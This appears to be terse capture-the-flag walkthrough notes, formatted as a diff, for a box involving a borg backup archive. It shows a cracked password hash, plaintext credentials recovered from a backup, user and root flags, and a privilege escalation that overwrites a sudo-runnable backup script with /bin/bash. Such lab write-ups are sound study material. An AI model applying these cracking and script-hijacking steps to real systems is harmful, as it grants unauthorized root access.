@@ -1,0 +1,31 @@
+music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward 
+
+squidward
+
+
+
+
+$ mkdir borgstuff
+
+$ borg mount /path/to/final_archive borgstuff
+
+
+
+borgstuff/music_archive/home/alex/Documents/note.txt
+
+alex:S3cretP@s3
+
+
+user.txt
+flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
+
+
+ - /etc/mp3backups/backup.sh
+$ chmod 777 /etc/mp3backups/backup.sh
+$ echo "/bin/bash" > /etc/mp3backups/backup.sh
+$ sudo /etc/mp3backups/backup.sh
+
+root.txt
+flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
